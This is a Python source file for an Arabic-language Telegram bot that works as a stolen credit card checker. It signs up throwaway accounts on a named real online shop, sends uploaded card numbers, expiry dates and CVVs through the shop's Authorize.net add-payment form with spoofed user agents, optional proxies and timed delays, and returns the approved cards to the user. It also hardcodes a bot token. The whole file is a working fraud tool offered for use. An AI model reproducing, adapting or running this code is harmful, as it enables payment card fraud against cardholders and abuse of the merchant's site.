from flask import Flask
from threading import Thread
import os
import requests
import re
import time
import random
import threading
import uuid
import shutil
from pathlib import Path
from colorama import Fore, Style, init
from queue import Queue
import fake_useragent
from telegram import Update, Bot
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# ==================== تهيئة Flask ====================
app = Flask('')

@app.route('/')
def home():
    return "✅ البوت شغال الحمدلله!"

def run_flask():
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = Thread(target=run_flask)
    t.daemon = True
    t.start()
    print("🌐 Flask server started")

# ==================== تهيئة الألوان ====================
init(autoreset=True)

# ==================== إعدادات البوت ====================
BOT_TOKEN = "8375573526:AAFVj27YqwLI_na3YksvMcApJOopObTaIII"
TEMP_DIR = "temp_files"
os.makedirs(TEMP_DIR, exist_ok=True)

# ==================== الكود الأصلي للأداة ====================

BASE_URL = "https://morgannasalchemy.com"
LOGIN_URL = f"{BASE_URL}/my-account/"
ADD_PAYMENT_URL = f"{BASE_URL}/my-account/add-payment-method/"

file_lock = threading.Lock()

def print_banner():
    print(Fore.RED + Style.BRIGHT + """
  =======================================================
  |                                                     |
  |           SCRIPT BY Obeida Trading                |
  |                                                     |
  =======================================================
""")

def generate_random_data():
    unique_id = str(uuid.uuid4())[:8]
    email = f"fuck_{unique_id}@example.com"
    password = f"Pass_{unique_id}!23"
    return email, password

class AuthorizeNetChecker:
    def __init__(self, proxy=None):
        self.session = requests.Session()
        self.proxy = {"http": proxy, "https": proxy} if proxy else None
        self.user_agent = fake_useragent.UserAgent().random
        self.session.headers.update({"User-Agent": self.user_agent})
        self.current_email = None
        self.current_password = None

    def register(self):
        try:
            self.current_email, self.current_password = generate_random_data()
            print(f"{Fore.YELLOW}[*] تسجيل حساب جديد: {self.current_email}...")
            
            resp = self.session.get(LOGIN_URL, proxies=self.proxy, timeout=20)
            nonce_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', resp.text)
            
            if not nonce_match:
                return False, "Could not find registration nonce, lol site gone boi"
            
            nonce = nonce_match.group(1)
            
            payload = {
                "email": self.current_email,
                "password": self.current_password,
                "woocommerce-register-nonce": nonce,
                "_wp_http_referer": "/my-account/",
                "register": "Register"
            }
            
            resp = self.session.post(LOGIN_URL, data=payload, proxies=self.proxy, timeout=30)
            
            if "Logout" in resp.text or "Dashboard" in resp.text or "My Account" in resp.text:
                print(f"{Fore.GREEN}✅ تم تسجيل الحساب بنجاح: {self.current_email}")
                return True, None
            else:
                return False, "Regi fail my boi maybe site dead or something"
        except Exception as e:
            return False, str(e)

    def check_card(self, cc_line):
        try:
            if "|" not in cc_line:
                return "ERROR", "Invalid CC format (use CC|MM|YYYY|CVV)"
            
            cc, mm, yy, cvv = cc_line.strip().split("|")
            
            exp_formatted = f"{mm} / {yy[-2:]}"
            
            resp = self.session.get(ADD_PAYMENT_URL, proxies=self.proxy, timeout=20)
            nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', resp.text)
            
            if not nonce_match:
                return "ERROR", "Could not find add-payment-method nonce"
            
            nonce = nonce_match.group(1)
            
            payload = {
                "payment_method": "yith_wcauthnet_credit_card_gateway",
                "yith_wcauthnet_credit_card_gateway-card-number": cc.replace(" ", "+"),
                "yith_wcauthnet_credit_card_gateway-card-expiry": exp_formatted,
                "yith_wcauthnet_credit_card_gateway-card-cvc": cvv,
                "yith_wcauthnet_credit_card_gateway-card-type": "",
                "woocommerce-add-payment-method-nonce": nonce,
                "_wp_http_referer": "/my-account/add-payment-method/",
                "woocommerce_add_payment_method": "1"
            }
            
            resp = self.session.post(ADD_PAYMENT_URL, data=payload, proxies=self.proxy, timeout=30)
            
            if "Payment method successfully added" in resp.text:
                return "succeed", "Success"
            elif "declined" in resp.text.lower() or "error" in resp.text.lower():
                err_match = re.search(r'class="woocommerce-error" role="alert">(.*?)</ul>', resp.text, re.DOTALL)
                if err_match:
                    clean_err = re.sub('<[^<]+?>', '', err_match.group(1)).strip()
                    return "DECLINED", clean_err
                return "DECLINED", "Card Declined"
            else:
                return "DECLINED", "Unknown result (Possible decline)"
                
        except Exception as e:
            return "ERROR", str(e)

def worker_single_file():
    """وظيفة المعالجة من ملف abood.txt - كل حساب 5 بطاقات مع انتظار 20 ثانية"""
    try:
        with open("abood.txt", "r", encoding='utf-8') as f:
            lines = [l.strip() for l in f.readlines() if l.strip()]
        
        if not lines:
            print(f"{Fore.RED}ملف abood.txt فارغ يا معلم!")
            return False, "الملف فارغ"
            
        print(f"{Fore.CYAN}تم العثور على {len(lines)} بطاقة في ملف abood.txt")
        
        # تحديد عدد البطاقات لكل حساب (5 بطاقات)
        cards_per_account = 5
        num_accounts = (len(lines) + cards_per_account - 1) // cards_per_account
        
        print(f"{Fore.YELLOW}سيتم استخدام {num_accounts} حساب (كل حساب {cards_per_account} بطاقات)")
        print(f"{Fore.RED}⚠️ سيتم الانتظار 20 ثانية بين كل بطاقة والأخرى!")
        
        approved_count = 0
        
        for account_num in range(num_accounts):
            start_idx = account_num * cards_per_account
            end_idx = min(start_idx + cards_per_account, len(lines))
            account_cards = lines[start_idx:end_idx]
            
            print(f"\n{Fore.MAGENTA}{'='*60}")
            print(f"{Fore.YELLOW}🔄 إنشاء حساب رقم {account_num + 1}/{num_accounts}")
            print(f"{Fore.MAGENTA}{'='*60}")
            
            # إنشاء حساب جديد
            checker = AuthorizeNetChecker()
            success, err = checker.register()
            
            if not success:
                print(f"{Fore.RED}❌ فشل تسجيل الحساب {account_num + 1}: {err}")
                # حفظ البطاقات في error
                for cc_line in account_cards:
                    with file_lock:
                        with open("error.txt", "a", encoding="utf-8") as f:
                            f.write(f"{cc_line} - فشل إنشاء الحساب\n")
                continue
            
            # فحص البطاقات بهذا الحساب
            print(f"{Fore.CYAN}📌 الحساب {checker.current_email} يفحص {len(account_cards)} بطاقات")
            print(f"{Fore.YELLOW}⏱️ سيتم الانتظار 20 ثانية بين كل بطاقة...")
            
            for i, cc_line in enumerate(account_cards, 1):
                start_time = time.time()
                
                print(f"\n{Fore.WHITE}[الحساب {account_num + 1} - بطاقة {i}/{len(account_cards)}] جاري فحص: {cc_line}")
                
                status, msg = checker.check_card(cc_line)
                
                elapsed_time = time.time() - start_time
                
                with file_lock:
                    if status == "succeed":
                        print(f"{Fore.GREEN}[✅ APPROVED] {cc_line} - {msg}")
                        with open("APPROVED.txt", "a", encoding="utf-8") as f: 
                            f.write(f"{cc_line} - {msg} - الحساب: {checker.current_email}\n")
                        approved_count += 1
                    elif status == "DECLINED":
                        print(f"{Fore.RED}[❌ DECLINED] {cc_line} - {msg}")
                        with open("declined.txt", "a", encoding="utf-8") as f: 
                            f.write(f"{cc_line} - {msg} - الحساب: {checker.current_email}\n")
                    else:
                        print(f"{Fore.WHITE}[⚠️ ERROR] {cc_line} - {msg}")
                        with open("error.txt", "a", encoding="utf-8") as f: 
                            f.write(f"{cc_line} - {msg} - الحساب: {checker.current_email}\n")
                
                # انتظار 20 ثانية قبل البطاقة التالية
                if i < len(account_cards):
                    wait_time = 20
                    remaining_wait = max(0, wait_time - elapsed_time)
                    
                    if remaining_wait > 0:
                        print(f"{Fore.BLUE}⏳ انتظار {remaining_wait:.1f} ثانية قبل البطاقة التالية...")
                        for second in range(int(remaining_wait), 0, -1):
                            if second % 5 == 0 or second <= 5:
                                print(f"{Fore.CYAN}⏱️ {second} ثانية متبقية...")
                            time.sleep(1)
            
            # حفظ معلومات الحساب
            with file_lock:
                with open("accounts_summary.txt", "a", encoding="utf-8") as f:
                    f.write(f"\n=== الحساب {account_num + 1}: {checker.current_email} | الباسورد: {checker.current_password} | تم فحص {len(account_cards)} بطاقات ===\n")
                    for i, cc_line in enumerate(account_cards, 1):
                        f.write(f"بطاقة {i}: {cc_line}\n")
                    f.write("="*50 + "\n")
            
            print(f"{Fore.GREEN}✅ الحساب {account_num + 1} اكتمل. جاري الانتقال للحساب التالي...")
            
            # انتظار 10 ثواني قبل الحساب الجديد
            if account_num < num_accounts - 1:
                print(f"{Fore.YELLOW}⏱️ انتظار 10 ثواني قبل إنشاء الحساب التالي...")
                time.sleep(10)
        
        print(f"\n{Fore.GREEN}{'='*60}")
        print(f"{Fore.GREEN}🎉 تم الانتهاء من فحص جميع البطاقات باستخدام {num_accounts} حسابات!")
        print(f"{Fore.GREEN}{'='*60}")
        
        return True, approved_count
        
    except FileNotFoundError:
        print(f"{Fore.RED}ملف abood.txt مش موجود!")
        return False, "الملف غير موجود"
    except Exception as e:
        print(f"{Fore.RED}حصل خطأ: {str(e)}")
        return False, str(e)

# ==================== دوال البوت ====================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """رسالة الترحيب وطلب الملف"""
    welcome_msg = (
        "🤖 *مرحباً بك في بوت فحص البطاقات*\n\n"
        "📁 أرسل لي ملف `abood.txt` الذي يحتوي على البطاقات المراد فحصها\n\n"
        "⚙️ *ملاحظات:*\n"
        "• الملف يجب أن يكون بصيغة `.txt`\n"
        "• كل بطاقة في سطر منفصل بصيغة: `CC|MM|YYYY|CVV`\n"
        "• سيتم فحص البطاقات باستخدام 5 بطاقات لكل حساب\n"
        "• بعد الانتهاء، سأرسل لك البطاقات الصالحة فقط (APPROVED)\n"
        "• قد تستغرق العملية وقتاً حسب حجم الملف"
    )
    await update.message.reply_text(welcome_msg, parse_mode='Markdown')

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """استقبال الملف ومعالجته"""
    user_id = update.effective_user.id
    
    # إرسال رسالة تأكيد استلام الملف
    await update.message.reply_text("📥 جاري استلام الملف...")
    
    try:
        # تحميل الملف
        file = await update.message.document.get_file()
        
        # التحقق من اسم الملف
        if not update.message.document.file_name.endswith('.txt'):
            await update.message.reply_text("❌ خطأ: الملف يجب أن يكون بصيغة .txt")
            return
        
        # التحقق من أن اسم الملف هو abood.txt
        if update.message.document.file_name.lower() != "abood.txt":
            await update.message.reply_text("❌ خطأ: اسم الملف يجب أن يكون `abood.txt` بالضبط", parse_mode='Markdown')
            return
        
        # حفظ الملف مؤقتاً
        temp_file_path = os.path.join(TEMP_DIR, f"abood_{user_id}_{int(time.time())}.txt")
        await file.download_to_drive(temp_file_path)
        
        # نسخ الملف إلى abood.txt في المجلد الحالي
        shutil.copy2(temp_file_path, "abood.txt")
        
        await update.message.reply_text("✅ تم استلام الملف بنجاح!\n🔄 جاري بدء الفحص...")
        
        # بدء عملية الفحص في ثريد منفصل
        threading.Thread(
            target=run_checker,
            args=(user_id, update.effective_chat.id, context.application.bot)
        ).start()
        
    except Exception as e:
        await update.message.reply_text(f"❌ حدث خطأ أثناء استلام الملف: {str(e)}")

def run_checker(user_id, chat_id, bot):
    """تشغيل أداة الفحص في ثريد منفصل وإرسال النتائج"""
    try:
        # إرسال رسالة بدء الفحص
        bot.send_message(
            chat_id=chat_id,
            text="🔍 *بدأت عملية الفحص...*\n⏱️ قد تستغرق وقتاً حسب عدد البطاقات",
            parse_mode='Markdown'
        )
        
        # تشغيل الفحص
        success, result = worker_single_file()
        
        # قراءة النتائج (البطاقات الصالحة فقط)
        approved_cards = []
        if os.path.exists("APPROVED.txt"):
            with open("APPROVED.txt", "r", encoding='utf-8') as f:
                approved_cards = [line.strip() for line in f.readlines() if line.strip()]
        
        # إرسال النتائج
        if approved_cards:
            # تقسيم النتائج إذا كانت كبيرة
            message = "✅ *البطاقات الصالحة (APPROVED):*\n\n"
            
            for i, card in enumerate(approved_cards, 1):
                card_line = f"{i}. `{card}`\n"
                
                # إذا تجاوز الطول 4000 حرف، نرسل رسالة جديدة
                if len(message + card_line) > 4000:
                    bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
                    message = f"{i}. `{card}`\n"
                else:
                    message += card_line
            
            # إرسال ما تبقى من الرسالة
            if message:
                bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
            
            # إرسال الملف أيضاً للاحتياط
            if os.path.exists("APPROVED.txt"):
                with open("APPROVED.txt", "rb") as f:
                    bot.send_document(chat_id=chat_id, document=f, filename="APPROVED.txt")
        else:
            bot.send_message(
                chat_id=chat_id,
                text="❌ لم يتم العثور على بطاقات صالحة.\nراجع ملفات declined.txt و error.txt للتفاصيل.",
                parse_mode='Markdown'
            )
        
        # إرسال إحصائيات سريعة
        stats = "📊 *إحصائيات الفحص:*\n\n"
        
        if os.path.exists("APPROVED.txt"):
            with open("APPROVED.txt", "r", encoding='utf-8') as f:
                approved_count = sum(1 for line in f if line.strip())
            stats += f"✅ Approved: {approved_count}\n"
        
        if os.path.exists("declined.txt"):
            with open("declined.txt", "r", encoding='utf-8') as f:
                declined_count = sum(1 for line in f if line.strip())
            stats += f"❌ Declined: {declined_count}\n"
        
        if os.path.exists("error.txt"):
            with open("error.txt", "r", encoding='utf-8') as f:
                error_count = sum(1 for line in f if line.strip())
            stats += f"⚠️ Errors: {error_count}\n"
        
        bot.send_message(chat_id=chat_id, text=stats, parse_mode='Markdown')
        
        bot.send_message(
            chat_id=chat_id,
            text="✅ *تم الانتهاء من الفحص!*\nيمكنك إرسال ملف جديد لفحص بطاقات أخرى.",
            parse_mode='Markdown'
        )
        
    except Exception as e:
        bot.send_message(
            chat_id=chat_id,
            text=f"❌ *حدث خطأ أثناء الفحص:*\n`{str(e)}`",
            parse_mode='Markdown'
        )
    finally:
        # تنظيف الملفات المؤقتة
        try:
            for temp_file in Path(TEMP_DIR).glob(f"abood_{user_id}_*.txt"):
                temp_file.unlink()
        except:
            pass

async def cleanup_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """أمر لتنظيف الملفات"""
    user_id = update.effective_user.id
    
    try:
        # حذف ملفات النتائج
        files_to_delete = ["APPROVED.txt", "declined.txt", "error.txt", "accounts_summary.txt", "abood.txt"]
        deleted = []
        
        for file in files_to_delete:
            if os.path.exists(file):
                os.remove(file)
                deleted.append(file)
        
        # تنظيف الملفات المؤقتة للمستخدم
        for temp_file in Path(TEMP_DIR).glob(f"abood_{user_id}_*.txt"):
            temp_file.unlink()
            deleted.append(str(temp_file))
        
        if deleted:
            await update.message.reply_text(f"🧹 تم تنظيف {len(deleted)} ملف/ملفات")
        else:
            await update.message.reply_text("✨ لا توجد ملفات للتنظيف")
            
    except Exception as e:
        await update.message.reply_text(f"❌ خطأ أثناء التنظيف: {str(e)}")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """عرض المساعدة"""
    help_text = (
        "📚 *أوامر البوت:*\n\n"
        "/start - بدء الاستخدام ورفع ملف\n"
        "/cleanup - تنظيف الملفات المؤقتة\n"
        "/help - عرض هذه المساعدة\n\n"
        "*طريقة الاستخدام:*\n"
        "1️⃣ أرسل ملف abood.txt\n"
        "2️⃣ انتظر حتى ينتهي الفحص\n"
        "3️⃣ استلم البطاقات الصالحة\n\n"
        "*صيغة البطاقات:*\n"
        "`CC|MM|YYYY|CVV`\n"
        "مثال: `4111111111111111|12|2025|123`"
    )
    await update.message.reply_text(help_text, parse_mode='Markdown')

def main():
    """تشغيل البوت"""
    # تشغيل Flask server
    keep_alive()
    
    # إنشاء مجلد temp_files إذا لم يكن موجوداً
    os.makedirs(TEMP_DIR, exist_ok=True)
    
    # إنشاء التطبيق
    application = Application.builder().token(BOT_TOKEN).build()
    
    # إضافة المعالجات
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("cleanup", cleanup_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    # تشغيل البوت
    print("🤖 البوت يعمل...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
